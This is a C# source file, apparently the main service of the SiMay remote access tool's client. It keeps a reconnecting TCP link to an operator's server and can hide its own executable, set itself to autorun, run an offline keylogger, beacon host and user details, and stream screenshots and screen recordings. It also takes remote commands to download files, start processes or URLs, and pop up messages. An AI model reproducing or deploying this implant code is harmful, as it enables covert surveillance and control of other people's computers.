using Microsoft.Win32;
using SiMay.Core;
using System;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using SiMay.Core.Enums;
using SiMay.Core.Packets;
using SiMay.Core.ScreenSpy;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Client;
using SiMay.Sockets.Tcp.Session;
using SiMay.Sockets.Tcp.TcpConfiguration;
using SiMay.RemoteService.NewCore.ControlService;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Basic;

namespace SiMay.RemoteService.NewCore.MainService
{
    /// <summary>
    /// 主连接模块
    /// 作用：与服务端保持长连接，接收工作指令打开其他模块工作连接，意外断开时能主动重连
    /// </summary>
    public class MainService
    {
        private bool _screenViewIsAction = false;
        private int _screen_record_height;
        private int _screen_record_width;
        private int _screen_record_spantime;
        private int _sessionKeep = 0;//主连接状态 0断开连接，1已连接

        private TcpSocketSaeaClientAgent _clientAgent;
        private TcpSocketSaeaSession _session;
        private ManagerTaskQueue _taskQueue = new ManagerTaskQueue();
        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
        public MainService()
        {
            if (AppConfiguartion.IsHideExcutingFile)
                ComputerSessionHelper.SetExecutingFileHide(true);

            if (AppConfiguartion.IsAutoRun)
                ComputerSessionHelper.SetAutoRun(true);

            if (!int.TryParse(AppConfiguartion.ScreenRecordHeight, out _screen_record_height))
                _screen_record_height = 800;

            if (!int.TryParse(AppConfiguartion.ScreenRecordWidth, out _screen_record_width))
                _screen_record_width = 1200;

            if (!int.TryParse(AppConfiguartion.ScreenRecordSpanTime, out _screen_record_spantime))
                _screen_record_spantime = 3000;

            bool bKeyboardOffline;
            if (!bool.TryParse(AppConfiguartion.KeyboardOffline, out bKeyboardOffline))
                bKeyboardOffline = false;

            if (bKeyboardOffline)
            {
                Keyboard _keyboard = Keyboard.GetKeyboardInstance();
                _keyboard.Initialization();
                _keyboard.StartOfflineRecords();//开始离线记录
            }
            //创建通讯接口实例
            var clientConfig = new TcpSocketSaeaClientConfiguration();

            if (!AppConfiguartion.IsCentreServiceMode)
            {
                //服务版配置
                clientConfig.AppKeepAlive = true;
                clientConfig.KeepAlive = false;
            }
            else
            {
                //中间服务器版服务端配置
                clientConfig.AppKeepAlive = false;
                clientConfig.KeepAlive = true;
            }
            clientConfig.KeepAliveInterval = 5000;
            clientConfig.KeepAliveSpanTime = 1000;

            _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, CompletetionNotify);
            ConnectToServer();
        }

        private void ConnectToServer()
        {
            _clientAgent.ConnectToServer(AppConfiguartion.ServerIPEndPoint);
        }

        private void SendMessageToServer(byte[] data)
        {
            if (_session == null)
                return;
            _session.SendAsync(data);
        }

        /// <summary>
        /// 发送确认包
        /// 
        /// 作用：连接确认，以便服务端识别这是一个有效的工作连接，type = 中间服务器识别
        /// </summary>
        /// <param name="session"></param>
        public void SendAckPack(TcpSocketSaeaSession session, ConnectionWorkType type)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_GLOBAL_CONNECT,
                new AckPack()
                {
                    AccessKey = AppConfiguartion.AccessKey,
                    Type = type
                });
            session.SendAsync(data);
        }

        /// <summary>
        /// 通信库主消息处理函数
        /// </summary>
        /// <param name="notify"></param>
        /// <param name="session"></param>
        public void CompletetionNotify(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            try
            {
                switch (notify)
                {
                    case TcpSocketCompletionNotify.OnConnected:
                        this.ConnectedHandler(session, notify);
                        break;
                    case TcpSocketCompletionNotify.OnDataReceiveing:
                        break;
                    case TcpSocketCompletionNotify.OnDataReceived:
                        var workType = (ConnectionWorkType)session.AppTokens[0];
                        if (workType == ConnectionWorkType.MAINCON)
                            this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                        else if (workType == ConnectionWorkType.WORKCON)
                            ((ServiceManager)session.AppTokens[1]).OnNotifyProc(notify, session);//工作连接处理函数
                        break;
                    case TcpSocketCompletionNotify.OnClosed:
                        this.CloseHandler(session, notify);
                        break;
                }
            }
            catch (Exception ex)
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(ex.Message);
                sb.Append(ex.StackTrace);
                LogHelper.WriteErrorByCurrentMethod(sb.ToString());

                Console.WriteLine(ex.Message);
            }

        }

        /// <summary>
        /// 连接初始化
        /// 
        /// 作用：分配工作类型
        /// </summary>
        /// <param name="session"></param>
        /// <param name="notify"></param>
        private void ConnectedHandler(TcpSocketSaeaSession session, TcpSocketCompletionNotify notify)
        {
            if (Interlocked.Exchange(ref _sessionKeep, 1) == 0)
            {
                this.SendAckPack(session, ConnectionWorkType.MAINCON);

                _session = session;
                //主连接优先获取session
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.MAINCON,
                    null
                };
            }
            else
            {
                this.SendAckPack(session, ConnectionWorkType.WORKCON);

                //消费工作实例
                ServiceManager manager = _taskQueue.Dequeue();
                if (manager == null)
                {
                    //无工作实例。。连接分配不到工作
                    session.Close(false);
                    return;
                }
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.WORKCON,
                    manager
                };
                manager.SetSession(session);
                manager.OnNotifyProc(notify, session);
            }

        }
        private void CloseHandler(TcpSocketSaeaSession session, TcpSocketCompletionNotify notify)
        {
            if (_sessionKeep == 0 && session.AppTokens == null)
            {
                //主连接连接失败
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.MAINCON,
                    null
                };
            }
            else if (_sessionKeep == 1 && session.AppTokens == null)//task连接，连接服务器失败
            {
                _taskQueue.Dequeue();//移除掉，不重试连接，因为可能会连接不上，导致频繁重试连接
                return;
            }

            var workType = (ConnectionWorkType)session.AppTokens[0];
            if (workType == ConnectionWorkType.MAINCON)
            {
                _screenViewIsAction = false;
                //清除主连接会话信息
                _session = null;
                Interlocked.Exchange(ref _sessionKeep, 0);

                System.Timers.Timer timer = new System.Timers.Timer();
                timer.Interval = 5000;
                timer.Elapsed += (s, e) =>
                {
                    //主连接重连
                    ConnectToServer();

                    timer.Stop();
                    timer.Dispose();
                };
                timer.Start();
            }
            else if (workType == ConnectionWorkType.WORKCON)
                ((ServiceManager)session.AppTokens[1]).OnNotifyProc(notify, session);
        }
        private void PostTaskToQueue(ServiceManager manager)
        {
            this._taskQueue.Enqueue(manager);
            this.ConnectToServer();
        }

        [PacketHandler(MessageHead.S_MAIN_ACTIVATE_CTRLSERVICE)]
        public void ActiveControlService(TcpSocketSaeaSession session)
        {
            string key = session.CompletedBuffer.GetMessageBody().ToUnicodeString();
            var context = SysUtil.ControlTypes.Where(x => x.ServiceKey.Equals(key)).FirstOrDefault();
            if (context != null)
            {
                var service = Activator.CreateInstance(context.CtrlType, null) as ServiceManager;
                this.PostTaskToQueue(service);
            }
        }

        [PacketHandler(MessageHead.S_MAIN_REMARK)]
        public void SetRemarkInfo(TcpSocketSaeaSession session)
        {
            var des = session.CompletedBuffer.GetMessageBody().ToUnicodeString();
            AppConfiguartion.RemarkInfomation = des;
        }
        [PacketHandler(MessageHead.S_MAIN_SESSION)]
        public void SetSystemSession(TcpSocketSaeaSession session)
        {
            ComputerSessionHelper.SessionManager(session.CompletedBuffer.GetMessageBody()[0]);
        }
        [PacketHandler(MessageHead.S_MAIN_HTTPDOWNLOAD)]
        public void HttpDownloadExecute(TcpSocketSaeaSession session)
        {
            DownloadHelper.DownloadFile(session.CompletedBuffer.GetMessageBody());
        }

        [PacketHandler(MessageHead.S_MAIN_OPEN_WEBURL)]
        public void OpenUrl(TcpSocketSaeaSession session)
        {
            try
            {
                Process.Start(session.CompletedBuffer.GetMessageBody().ToUnicodeString());
            }
            catch { }
        }
        [PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW)]
        public void CreateDesktopView(TcpSocketSaeaSession session)
        {
            var isConstraint = session.CompletedBuffer.GetMessageBody()[0];
            AppConfiguartion.IsOpenScreenView = "true";
            if (_screenViewIsAction != true || isConstraint == 0)
                this.OnRemoteCreateDesktopView();
        }

        /// <summary>
        /// 发送桌面下一帧
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.S_MAIN_SCREENWALL_GETIMG)]
        public void SendNextScreenView(TcpSocketSaeaSession session)
        {
            ThreadPool.QueueUserWorkItem(c =>
            {
                var getframe = session.CompletedBuffer.GetMessageEntity<DesktopViewGetFramePack>();
                if (getframe.Width == 0 || getframe.Height == 0 || getframe.TimeSpan == 0 || getframe.TimeSpan < 50)
                    return;

                Thread.Sleep(getframe.TimeSpan);

                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_SCREENWALL_IMG,
                    ScreenCaptureHelper.CaptureNoCursorToBytes(getframe.Width, getframe.Height));

                SendMessageToServer(data);
            });
        }
        [PacketHandler(MessageHead.S_MAIN_USERDESKTOP_CLOSE)]
        public void CloseDesktopView(TcpSocketSaeaSession session)
        {
            _screenViewIsAction = false;
            AppConfiguartion.IsOpenScreenView = "false";
        }
        [PacketHandler(MessageHead.S_MAIN_SCREEN_RECORD_OPEN)]
        public void ActionScreenRecord(TcpSocketSaeaSession session)
        {
            var getframe = session.CompletedBuffer.GetMessageEntity<DesktopRecordGetFramePack>();
            _screen_record_height = getframe.Height;
            _screen_record_width = getframe.Width;
            _screen_record_spantime = getframe.TimeSpan;

            if (_screen_record_height <= 0 || _screen_record_width <= 0 || _screen_record_spantime < 500)
                return;

            AppConfiguartion.ScreenRecordHeight = _screen_record_height.ToString();
            AppConfiguartion.ScreenRecordWidth = _screen_record_width.ToString();
            AppConfiguartion.ScreenRecordSpanTime = _screen_record_spantime.ToString();
            AppConfiguartion.IsScreenRecord = "true";

            //主机名称作为目录名
            this.SendMessageToServer(MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_SCREEN_RECORD_OPEN, Environment.MachineName));
        }
        [PacketHandler(MessageHead.S_MAIN_SCREEN_RECORD_CLOSE)]
        public void ScreenRecordClose(TcpSocketSaeaSession session)
        {
            AppConfiguartion.IsScreenRecord = "false";
        }

        /// <summary>
        /// 远程创建屏幕墙屏幕视图
        /// </summary>
        private void OnRemoteCreateDesktopView()
        {
            _screenViewIsAction = true;
            //创建屏幕
            string RemarkName = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;

            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_USERDESKTOP_CREATE,
                new DesktopViewDescribePack()
                {
                    MachineName = Environment.MachineName,
                    RemarkInformation = RemarkName
                });

            SendMessageToServer(data);
        }



        /// <summary>
        /// 发送下一帧屏幕记录
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        [PacketHandler(MessageHead.S_MAIN_SCREEN_RECORD_GETIMG)]
        public void SendNextScreenRecordView(TcpSocketSaeaSession session)
        {

            ThreadPool.QueueUserWorkItem((o) =>
            {
                if (_screen_record_width == 0 || _screen_record_height == 0)
                    return;

                Thread.Sleep(_screen_record_spantime);

                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_SCREEN_RECORD_IMG,
                    ScreenCaptureHelper.CaptureNoCursorToBytes(_screen_record_width, _screen_record_height));

                SendMessageToServer(data);
            });
        }

        [PacketHandler(MessageHead.S_MAIN_MESSAGEBOX)]
        public void ShowMessageBox(TcpSocketSaeaSession session)
        {
            var msg = session.CompletedBuffer.GetMessageEntity<MessagePack>();
            ThreadHelper.CreateThread(() =>
            {
                string title = msg.MessageTitle;
                string cont = msg.MessageBody;

                switch ((MessageIcon)msg.MessageIcon)
                {
                    case MessageIcon.Error:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.Question:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.InforMation:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.Exclaim:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;
                }
            }, true);
        }
        /// <summary>
        /// 发送上线包
        /// </summary>
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void SendLoginPack(TcpSocketSaeaSession session)
        {
            string RemarkInfomation = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;
            string openScreenWall = AppConfiguartion.IsOpenScreenView ?? "true";//默认为打开屏幕墙
            string openScreenRecord = AppConfiguartion.IsScreenRecord ?? "false"; //默认屏幕记录

            var loginPack = new LoginPack();
            loginPack.IPV4 = SystemInfoUtil.GetLocalIPV4();
            loginPack.MachineName = Environment.MachineName;
            loginPack.Remark = RemarkInfomation;
            loginPack.ProcessorCount = Environment.ProcessorCount;
            loginPack.ProcessorInfo = SystemInfoUtil.GetMyCpuInfo;
            loginPack.MemorySize = SystemInfoUtil.GetMyMemorySize;
            loginPack.StartRunTime = AppConfiguartion.RunTime;
            loginPack.ServiceVison = AppConfiguartion.Version;
            loginPack.UserName = Environment.UserName.ToString();
            loginPack.OSVersion = SystemInfoUtil.GsystemEdition;
            loginPack.OpenScreenWall = (openScreenWall == "true" ? true : false);
            loginPack.ExistCameraDevice = SystemInfoUtil.ExistCameraDevice();
            loginPack.ExitsRecordDevice = SystemInfoUtil.ExistRecordDevice();
            loginPack.ExitsPlayerDevice = SystemInfoUtil.ExistPlayDevice();
            loginPack.IdentifyId = AppConfiguartion.IdentifyId;
            loginPack.OpenScreenRecord = (openScreenRecord == "true" ? true : false);
            loginPack.RecordHeight = _screen_record_height;
            loginPack.RecordWidth = _screen_record_width;
            loginPack.RecordSpanTime = _screen_record_spantime;

            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_LOGIN,
                loginPack);

            SendMessageToServer(data);
        }
    }
}